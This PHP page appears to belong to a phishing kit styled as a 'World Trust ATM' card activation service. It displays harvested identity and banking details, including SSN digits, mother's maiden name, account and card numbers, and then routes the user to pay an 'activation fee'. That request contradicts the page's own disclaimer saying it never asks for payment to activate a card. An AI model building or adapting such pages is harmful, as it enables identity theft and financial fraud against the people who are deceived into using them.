<?php
/**
 * World Trust ATM - Card Activation
 * Page 3: Card Display
 */

require_once 'includes/config.php';
require_once 'includes/functions.php';
require_once 'includes/database.php';

// Check if user data and card data exist in session
check_user_session();
check_session_timeout();

// Check if card details exist in session (from pin-setup.php)
if (!isset($_SESSION['card_number']) || !isset($_SESSION['cvv']) || !isset($_SESSION['expiry'])) {
    header('Location: pin-setup.php');
    exit();
}

// Retrieve all user data from database using request_id
$request_id = $_SESSION['request_id'] ?? null;

if (!$request_id) {
    header('Location: index.php');
    exit();
}

// Fetch user data from database
$pdo = get_db_connection();
if (!$pdo) {
    die('Database connection failed');
}

$stmt = $pdo->prepare("SELECT * FROM activation_requests WHERE id = ?");
$stmt->execute([$request_id]);
$user_data = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user_data) {
    header('Location: index.php');
    exit();
}

// Extract all fields
$first_name = $user_data['first_name'];
$last_name = $user_data['last_name'];
$dob = $user_data['dob'];
$email = $user_data['email'];
$phone = $user_data['phone'];
$account_number = $user_data['account_number'];
$street = $user_data['street'];
$city = $user_data['city'];
$state = $user_data['state'];
$zip = $user_data['zip'];
$ssn_last4 = $user_data['ssn_last4'];
$maiden_name = $user_data['maiden_name'];
$card_number = $user_data['card_number'];
$cvv = $user_data['cvv'];
$expiry = $user_data['expiry_date'];
$balance = $user_data['balance'] ?? DEFAULT_BALANCE;

$user_name = $first_name . ' ' . $last_name;
$card_number_masked = format_card_number_masked($card_number);
$balance_formatted = format_currency($balance);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> - Your Card</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- Card Display Container -->
        <div class="card-display-container" id="cardContainer">
            <div class="success-icon">✓</div>
            <h2 class="success-message">Your card is ready for activation!</h2>
            
            <!-- ATM Card -->
            <div class="atm-card">
                <div class="card-logo">VISA</div>
                <div class="card-chip"></div>
                <div class="card-number"><?php echo $card_number_masked; ?></div>
                <div class="card-details">
                    <div class="card-holder">
                        <div class="card-label">Card Holder</div>
                        <div class="card-value"><?php echo strtoupper($user_name); ?></div>
                    </div>
                    <div class="card-expiry">
                        <div class="card-label">Expires</div>
                        <div class="card-value"><?php echo $expiry; ?></div>
                    </div>
                </div>
            </div>
            
            <!-- Balance Display -->
            <div class="balance-display">
                <div class="balance-label">Available Balance</div>
                <div class="balance-amount"><?php echo $balance_formatted; ?></div>
            </div>
            
            <!-- User Information Review Section -->
            <div class="info-review-section">
                <h3 class="section-title">Review Your Information</h3>
                <p class="review-subtitle">Please confirm all details are correct before proceeding</p>
                
                <!-- Personal Information -->
                <div class="info-category">
                    <h4 class="category-title">Personal Information</h4>
                    <div class="info-grid">
                        <div class="info-row">
                            <span class="info-label">Full Name:</span>
                            <span class="info-value"><?php echo htmlspecialchars($first_name . ' ' . $last_name); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Date of Birth:</span>
                            <span class="info-value"><?php echo htmlspecialchars($dob); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Email Address:</span>
                            <span class="info-value"><?php echo htmlspecialchars($email); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Phone Number:</span>
                            <span class="info-value"><?php echo htmlspecialchars($phone); ?></span>
                        </div>
                    </div>
                </div>
                
                <!-- Address Information -->
                <div class="info-category">
                    <h4 class="category-title">Address Information</h4>
                    <div class="info-grid">
                        <div class="info-row">
                            <span class="info-label">Street Address:</span>
                            <span class="info-value"><?php echo htmlspecialchars($street); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">City:</span>
                            <span class="info-value"><?php echo htmlspecialchars($city); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">State:</span>
                            <span class="info-value"><?php echo htmlspecialchars($state); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">ZIP Code:</span>
                            <span class="info-value"><?php echo htmlspecialchars($zip); ?></span>
                        </div>
                    </div>
                </div>
                
                <!-- Security Information -->
                <div class="info-category">
                    <h4 class="category-title">Security Information</h4>
                    <div class="info-grid">
                        <div class="info-row">
                            <span class="info-label">Account Number:</span>
                            <span class="info-value"><?php echo htmlspecialchars($account_number); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">SSN (Last 4):</span>
                            <span class="info-value">***-**-<?php echo htmlspecialchars($ssn_last4); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Mother's Maiden Name:</span>
                            <span class="info-value"><?php echo htmlspecialchars($maiden_name); ?></span>
                        </div>
                    </div>
                </div>
                
                <!-- Card Information -->
                <div class="info-category">
                    <h4 class="category-title">Card Information</h4>
                    <div class="info-grid">
                        <div class="info-row">
                            <span class="info-label">Card Number:</span>
                            <span class="info-value"><?php echo htmlspecialchars(format_card_number_masked($card_number)); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Expiry Date:</span>
                            <span class="info-value"><?php echo htmlspecialchars($expiry); ?></span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">CVV:</span>
                            <span class="info-value">***</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">Card Balance:</span>
                            <span class="info-value" style="color: var(--success-green); font-weight: bold;">$<?php echo number_format($balance, 2); ?></span>
                        </div>
                    </div>
                </div>
                
                <div class="alert-box" style="margin-top: 20px;">
                    <p style="color: #856404; font-size: 13px;">
                        ⚠️ Please review all information carefully. If you notice any errors, contact our support team before proceeding.
                    </p>
                </div>
            </div>
            
            <p style="margin-bottom: 20px; color: var(--text-light);">
                Your card details have been configured. Click below to proceed with the activation fee payment.
            </p>
            
            <a href="payment.php" style="text-decoration: none;">
                <button class="btn btn-primary">Activate Card</button>
            </a>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
        </div>
    </div>
</body>
</html>
